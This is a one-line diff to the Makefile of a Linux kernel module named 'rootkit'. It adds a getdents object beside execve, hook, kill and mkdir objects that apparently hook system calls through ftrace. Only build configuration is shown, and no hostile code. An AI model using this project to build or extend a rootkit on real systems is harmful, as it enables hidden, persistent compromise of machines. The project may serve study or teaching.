@@ -1,4 +1,4 @@
-rootkit-objs := base.o execve.o hook.o kill.o mkdir.o random.o
+rootkit-objs := base.o execve.o getdents.o hook.o kill.o mkdir.o random.o
 obj-m += rootkit.o
 
 # Disable tail recursion optimizations to avoid interfering with ftrace hooks.
